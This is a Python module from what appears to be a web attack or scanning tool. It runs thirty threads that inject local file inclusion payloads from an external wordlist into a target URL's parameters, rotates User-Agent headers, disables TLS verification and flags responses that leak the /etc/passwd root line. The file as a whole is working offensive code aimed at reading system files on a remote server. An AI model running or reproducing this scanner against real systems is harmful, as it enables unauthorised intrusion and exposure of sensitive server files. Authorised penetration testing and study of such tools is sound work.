import threading
import queue
import requests
import re
import random
from core import nano
from core import regex
from requests.packages import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


threads =30

def build_wordlist():
    
    words= queue.Queue()
    for word in regex.LFI:
        word = word.rstrip()
        words.put(word)
        
    return words

def run(word_queue,url):
    
    while not word_queue.empty():
        attempt = word_queue.get()
        attempt_list = []
        attempt_list.append(attempt)

       
        for brute in attempt_list:  
            user_agent=random.choice(regex.USR_AGENTS)
            headers={'User-Agent':user_agent }
            try:
                url = nano.inject_param(url,str(brute))               
                r = requests.get(url,headers=headers,verify=False)
                resp= r.content
            
                if(re.search('root:[x*]:0:0:', str(resp))): 
                       print("\033[91mPossibly LFI vulnerability\033[00m  "+url)
                       break
 
                else:
                    pass
            except:
               pass
           

word_queue = build_wordlist()
def lfi_(url):
     for i in range(threads):
         t = threading.Thread(target=run,args=(word_queue,url))
         t.start()
         



